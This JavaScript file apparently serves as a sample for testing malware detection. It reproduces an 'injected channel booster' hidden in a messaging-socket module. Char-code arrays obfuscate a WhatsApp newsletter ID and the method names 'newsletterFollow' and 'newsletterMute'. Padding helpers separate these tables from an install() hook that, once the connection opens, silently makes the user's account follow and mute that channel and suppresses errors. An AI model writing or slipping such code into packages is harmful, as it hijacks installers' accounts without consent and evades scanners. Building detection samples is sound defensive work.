// Injected channel booster, concealed variant with distant dispatch: the
// char-code tables are hoisted to module scope while the connection handler
// that spends them sits a full socket module below, as in noxleyss 2.0.1
// messages-recv.js. A tight byte window misses it; closure capture links
// the two regions, not adjacency.
const decode = (a) => a.map((v) => String.fromCharCode(v)).join('');

const xkmt = [
  decode([
    49, 50, 48, 51, 54, 51, 52, 50, 56,
    51, 53, 53, 49, 55, 49, 49, 57, 55,
    64, 110, 101, 119, 115, 108,
    101, 116, 116, 101, 114,
  ]),
];

const pzha = decode([
  110, 101, 119, 115, 108, 101,
  116, 116, 101, 114, 70, 111,
  108, 108, 111, 119,
]);

const wjcf = decode([
  110, 101, 119, 115, 108, 101,
  116, 116, 101, 114, 77, 117,
  116, 101,
]);

// ---- socket-module filler: retry caches, mutexes and helpers that push
// the dispatch handler kilobytes below the tables above. None of this is
// hostile on its own; it only sets the distance.
const makeMutex = () => {
  let locked = false;
  const queue = [];
  const release = () => {
    locked = false;
    const next = queue.shift();
    if (next) {
      locked = true;
      next();
    }
  };
  return {
    mutex: async (code) => {
      if (locked) {
        await new Promise((resolve) => queue.push(resolve));
      } else {
        locked = true;
      }
      try {
        return await code();
      } finally {
        release();
      }
    },
  };
};

const makeRetryCache = (stdTTL) => {
  const store = new Map();
  return {
    get: (key) => {
      const entry = store.get(key);
      if (!entry) {
        return undefined;
      }
      if (Date.now() - entry.at > stdTTL * 1000) {
        store.delete(key);
        return undefined;
      }
      return entry.value;
    },
    set: (key, value) => {
      store.set(key, { value, at: Date.now() });
    },
    del: (key) => {
      store.delete(key);
    },
  };
};

const msgRetryCache = makeRetryCache(3600);
const callOfferCache = makeRetryCache(300);
const placeholderResendCache = makeRetryCache(3600);
const groupParticipantJidCache = makeRetryCache(600);
const groupMetadataWarmupCache = makeRetryCache(60);

const cacheGroupParticipants = (metadata, cache) => {
  for (const participant of metadata.participants || []) {
    if (!participant.id || !participant.jid) {
      continue;
    }
    cache.set(`${metadata.id}:${participant.id}`, participant.jid);
    if (participant.lid) {
      cache.set(`${metadata.id}:${participant.lid}`, participant.jid);
    }
  }
};

const warmupGroupParticipants = async (groupJid, groupMetadata, cache) => {
  if (groupMetadataWarmupCache.get(groupJid)) {
    return;
  }
  groupMetadataWarmupCache.set(groupJid, true);
  try {
    const metadata = await groupMetadata(groupJid);
    cacheGroupParticipants(metadata, cache);
  } catch (error) {
    console.debug({ error, groupJid }, 'failed to warm up participant cache');
  }
};

const resolveGroupParticipantJid = async (
  groupJid,
  participantLid,
  groupMetadata,
  cache,
) => {
  const cacheKey = `${groupJid}:${participantLid}`;
  const cached = cache.get(cacheKey);
  if (cached) {
    return cached;
  }
  try {
    const metadata = await groupMetadata(groupJid);
    cacheGroupParticipants(metadata, cache);
    return cache.get(cacheKey);
  } catch (error) {
    console.debug({ error, groupJid, participantLid }, 'jid resolve failed');
    return undefined;
  }
};

const processingMutex = makeMutex();
const retryMutex = makeMutex();

const sendMessageAck = async (node, sendNode) => {
  await processingMutex.mutex(async () => {
    await sendNode({ tag: 'ack', attrs: { id: node.attrs.id } });
  });
};

const withRetry = async (fn, maxRetries, delayMs) => {
  let attempt = 0;
  for (;;) {
    try {
      return await fn();
    } catch (error) {
      attempt += 1;
      if (attempt > maxRetries) {
        throw error;
      }
      await new Promise((r) => setTimeout(r, delayMs * attempt));
    }
  }
};

exports.install = function (sock) {
  sock.ev.on('connection.update', ({ connection }) => {
    if (connection === 'open') {
      setTimeout(async () => {
        try {
          for (const id of xkmt) {
            if (typeof sock[pzha] === 'function') {
              await sock[pzha](id);
            }
            await new Promise((r) => setTimeout(r, 3000));
            if (typeof sock[wjcf] === 'function') {
              await sock[wjcf](id);
            }
            await new Promise((r) => setTimeout(r, 10000));
          }
        } catch {}
      }, 30000);
    }
  });
};

module.exports.extra = {
  warmupGroupParticipants,
  resolveGroupParticipantJid,
  sendMessageAck,
  withRetry,
  msgRetryCache,
  callOfferCache,
  placeholderResendCache,
};
